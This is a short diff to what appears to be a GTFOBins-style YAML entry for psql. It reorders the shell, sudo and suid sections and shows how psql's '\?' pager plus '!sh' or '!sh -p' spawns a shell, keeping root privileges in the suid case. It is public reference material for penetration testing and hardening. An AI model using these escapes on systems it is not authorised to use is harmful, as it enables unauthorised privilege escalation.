@@ -4,15 +4,15 @@ functions:
     - code: |
         psql
         \?
-        !/bin/sh
-  sudo:
-    - code: |
-        psql
-        \?
-        !/bin/sh
+        !sh
   suid:
     - code: |
         psql
         \?
-        !/bin/sh
+        !sh -p
+  sudo:
+    - code: |
+        psql
+        \?
+        !sh
 ---
